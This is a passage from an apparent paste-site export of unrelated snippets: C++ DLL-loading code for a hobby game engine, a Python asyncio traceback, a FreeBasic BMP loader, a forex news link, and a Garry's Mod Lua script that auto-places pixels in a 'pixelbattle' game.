PYX_GAME_API IGameAPI* getPyxGameAPI(PyxContext* context) {
	GameAPI* api{ new GameAPI(context) };
	return api;
}

// PyxEngine/public/EngineAPI.h
#pragma once
#include ""Types.h""

#ifdef PYX_PLATFORM_WINDOWS
	#ifdef PYX_BUILD_ENGINE
		#define PYX_ENGINE_API extern ""C"" __declspec(dllexport)
	#else
		#define PYX_ENGINE_API extern ""C""
	#endif
#else
	#error Platform not supported
#endif

typedef struct SDL_Window SDL_Window;

class IPyxEngineAPI {
   public:
	virtual ~IPyxEngineAPI() = default;
	virtual void init(SDL_Window* window) = 0;
};

typedef IPyxEngineAPI* GetPyxEngineAPI(PyxContext* context);

// PyxEngine/public/EngineAPI.cpp
#include ""EngineAPI.h""
#include ""../src/Logger.h""
#include ""../src/VulkanRenderer/Renderer.h""

#include <iostream>

class PyxEngineAPI : public IPyxEngineAPI {
   public:
	PyxEngineAPI(PyxContext* context) : m_Context(context) {}
	void init(SDL_Window* window) override {
		pyx::Logger::init();
		VulkanRenderer::init(window);
	}

   private:
	PyxContext* m_Context;
};

PYX_ENGINE_API IPyxEngineAPI* getPyxEngineAPI(PyxContext* context) {
	IPyxEngineAPI* api{ new PyxEngineAPI(context) };
	return api;
}

// PyxEngine/public/GameInterface.h
#pragma once
#include ""GameAPI.h""

#ifdef PYX_PLATFORM_WINDOWS
	#ifdef PYX_BUILD_ENGINE
		#define PYX_GAME extern ""C""
	#else
		#define PYX_GAME extern ""C"" __declspec(dllexport)
	#endif
#else
	#error Platform not supported
#endif

class IGame {
   public:
	virtual ~IGame() = default;
	virtual void start() = 0;
	virtual void update() = 0;
};

typedef IGame* GetGame(IGameAPI* pyxGameAPI);

// examples/FirstExample/src/MyGame.h
#pragma once
#include ""GameInterface.h""

class MyGame : public IGame {
   public:
	inline MyGame(IGameAPI* pyxGameAPI) : m_Pyx(pyxGameAPI) {}
	void start() override;
	void update() override;

   private:
	IGameAPI* m_Pyx;
};

// examples/FirstExample/src/MyGame.cpp
#include ""MyGame.h""

void MyGame::start() {
	m_Pyx->helloWorld();
}

void MyGame::update() {}

PYX_GAME IGame* getGame(IGameAPI* pyxGameAPI) {
	IGame* game{ new MyGame(pyxGameAPI) };
	return game;
}

// Runtime/src/Platforms/Windows/Main.cpp
// previous code...

	HMODULE gameDLL{ LoadLibraryA(""Game.dll"") };
	HMODULE pyxEngineDLL{ LoadLibraryA(""PyxEngine.dll"") };

	GetPyxGameAPI* getPyxGameAPI{ reinterpret_cast<GetPyxGameAPI*>(
		GetProcAddress(pyxEngineDLL, ""getPyxGameAPI"")
	) };
	GetPyxEngineAPI* getPyxEngineAPI{ reinterpret_cast<GetPyxEngineAPI*>(
		GetProcAddress(pyxEngineDLL, ""getPyxEngineAPI"")
	) };
	GetGame* getGame{
		reinterpret_cast<GetGame*>(GetProcAddress(gameDLL, ""getGame""))
	};

	PyxContext engineContext{};

	IGameAPI* gameAPI{ getPyxGameAPI(&engineContext) };
	IPyxEngineAPI* engineAPI{ getPyxEngineAPI(&engineContext) };

	engineAPI->init(window);
	IGame* game{ getGame(gameAPI) };
	game->start();

// subsiquent code..."
0VEYR7mF,AttributeError: module 'asyncio' has no attribute 'TaskGroup',basedcount_bot,Python,Sunday 24th of March 2024 03:53:29 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/backup_and_cheating/back_up_and_cheating.py"", line 65, in backup_and_cheating_runner
    async with asyncio.TaskGroup() as tg:
AttributeError: module 'asyncio' has no attribute 'TaskGroup'
"
xUgpXDZk,Untitled,Mysoft,FreeBasic,Sunday 24th of March 2024 03:20:34 PM CDT,"function LoadBmp( sBmpFile as string ) as fb.image ptr    
  var f = freefile()
  if open(sBmpFile for binary access read as #f) then return 0
  dim as long iWid,iHei
  get #f,19,iWid : get #f,,iHei : close #f
  var pTemp = imagecreate(iWid,iHei,1) : bload sBmpFile,pTemp
  return pTemp  
end function
"
6VZxqvAV,IC Markets Now Live On TradingView,fxvnpro,PHP,Sunday 24th of March 2024 03:14:30 PM CDT,https://www.fxvnpro.com/ic-markets-now-live-on-tradingview/
Yjk6qiEg,Untitled,kirkarr,Lua,Sunday 24th of March 2024 02:43:07 PM CDT,"local ofx, ofy = 0, 0
local sx, sy = 32, 32
local x, y = 0, 0
local last = 0
hook.Add(""Tick"",""fill"",function ()
	cur = CurTime()
    if cur - last > 0.35 then
        net.Start(""pixelbattle"")
        net.WriteUInt(ofx+x,24)
        net.WriteUInt(ofy+y,24)
        net.WriteUInt(pixelbattle.encode(HSVToColor((x/sx) * 180 + (y/sy)*180,1,1)),24)
        net.SendToServer()
        last = cur
        x = x + 1
        if x > sx then
        	x = 0
            y = y + 1
        end
        if y > sy then
        	y = 0     
        end
    end
end)"
